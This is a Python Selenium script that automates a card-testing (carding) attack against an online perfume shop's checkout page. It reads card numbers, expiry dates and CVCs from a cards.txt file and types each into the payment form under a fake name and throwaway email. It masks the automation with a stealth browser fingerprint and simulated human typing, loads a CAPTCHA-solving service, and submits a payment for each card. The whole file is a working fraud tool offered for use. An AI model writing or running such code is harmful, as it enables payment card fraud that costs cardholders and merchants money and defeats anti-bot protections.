import os
import time

import selenium.webdriver.support.expected_conditions as EC
from dotenv import load_dotenv
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium_stealth import stealth
from twocaptcha import TwoCaptcha
from webdriver_manager.chrome import ChromeDriverManager

load_dotenv()

options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)

driver = webdriver.Chrome(
    options=options,
    service=Service(ChromeDriverManager().install()),
)

stealth(
    driver,
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.105 Safari/537.36",
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

driver.get(
    "https://perfumerysamples.com/checkouts/cn/Z2NwLWV1cm9wZS13ZXN0MTowMUhTUk5QSzZNM1ZKQ1QyVzdHVDlEWDNCTQ"
)

file = open("cards.txt", "r")

solver = TwoCaptcha(os.environ.get("TWOCAPTCHA_API_KEY"))

start = True

text_field = 0
select = 1

for line in file.readlines():
    number = ""
    expiry = ""
    cvc = ""

    if start:
        print(f"Trying card {line}")
        global cc

        cc = line.split("|")

        for i in range(4):
            cc[i - 1] = cc[i - 1].replace("\n", "")  # Remove line breaks

        number = str(cc[0])
        expiry = str(
            cc[1] + cc[2][len(cc[2]) - 2 :]
        )  # Convert MM, YYYY to MMYY
        cvc = str(cc[3])

        month = expiry[len(expiry) - 4 :]
        year = expiry[len(expiry) - 2 :]

        driver.switch_to.default_content()

        email = "accnotreal1337@proton.me"
        first_name = "Morgan"
        last_name = "LaHaye"
        address = "14 Main St"
        city = "Ballymahon"
        county = "Longford"
        postal_code = "N39 C3X4"

        driver.find_element(By.XPATH, "//input[@id='email']").clear()
        for i in email:
            driver.find_element(By.XPATH, "//input[@id='email']").send_keys(i)
            time.sleep(0.1)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field}']"
        ).clear()
        for i in first_name:
            driver.find_element(
                By.XPATH, f"//input[@id='TextField{text_field}']"
            ).send_keys(i)
            time.sleep(0.1)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field + 1}']"
        ).clear()
        for i in last_name:
            driver.find_element(
                By.XPATH, f"//input[@id='TextField{text_field + 1}']"
            ).send_keys(i)
            time.sleep(0.1)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field + 2}']"
        ).clear()
        for i in address:
            driver.find_element(
                By.XPATH, f"//input[@id='TextField{text_field + 2}']"
            ).send_keys(i)
            time.sleep(0.1)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field + 3}']"
        ).clear()
        for i in city:
            driver.find_element(
                By.XPATH, f"//input[@id='TextField{text_field + 3}']"
            ).send_keys(i)
            time.sleep(0.1)

        driver.find_element(
            By.XPATH, f"//select[@id='Select{select}']"
        ).send_keys(county)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field + 4}']"
        ).clear()
        for i in postal_code:
            driver.find_element(
                By.XPATH, f"//input[@id='TextField{text_field + 4}']"
            ).send_keys(i)

        driver.find_element(
            By.XPATH, f"//input[@id='TextField{text_field + 4}']"
        ).send_keys(Keys.TAB)
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-number-')]",
                )
            )
        )

        for i in number:
            driver.find_element(By.XPATH, "//input[@id='number']").send_keys(i)
            time.sleep(0.1)

        driver.switch_to.default_content()
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-expiry-')]",
                )
            )
        )

        for i in expiry:
            driver.find_element(By.XPATH, "//input[@id='expiry']").send_keys(i)
            time.sleep(0.1)

        driver.switch_to.default_content()
        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it(
                (
                    By.XPATH,
                    "//*[starts-with(@id, 'card-fields-verification_value-')]",
                )
            )
        )

        for i in cvc:
            driver.find_element(
                By.XPATH, "//input[@id='verification_value']"
            ).send_keys(i)
            time.sleep(0.1)

        driver.switch_to.default_content()

        driver.find_element(
            By.XPATH,
            "//*[@id='pay-button-container']/div/div/button",
        ).click()
        time.sleep(10)
        driver.find_element(
            By.XPATH,
            "//*[@id='pay-button-container']/div/div/button",
        ).click()

        time.sleep(15)
        text_field += 7
        select += 2
